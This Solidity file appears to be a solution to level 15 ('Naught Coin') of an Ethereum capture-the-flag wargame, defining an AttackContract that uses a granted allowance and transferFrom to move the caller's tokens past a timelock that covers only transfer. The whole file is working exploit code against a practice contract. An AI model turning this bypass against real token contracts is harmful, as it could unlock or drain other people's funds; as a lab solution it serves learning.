// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";

// ================================================================
// │                     LEVEL 15 - NAUGHT COIN                   │
// ================================================================
interface ERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
}

contract AttackContract {
    address targetContractAddress;

    constructor(address _targetContractAddress) {
        targetContractAddress = _targetContractAddress;
    }

    function attack() public {
        uint256 allowance = ERC20(targetContractAddress).allowance(msg.sender, address(this));

        // Transfer all tokens to this contract address
        ERC20(targetContractAddress).transferFrom(msg.sender, address(this), allowance);
    }
}
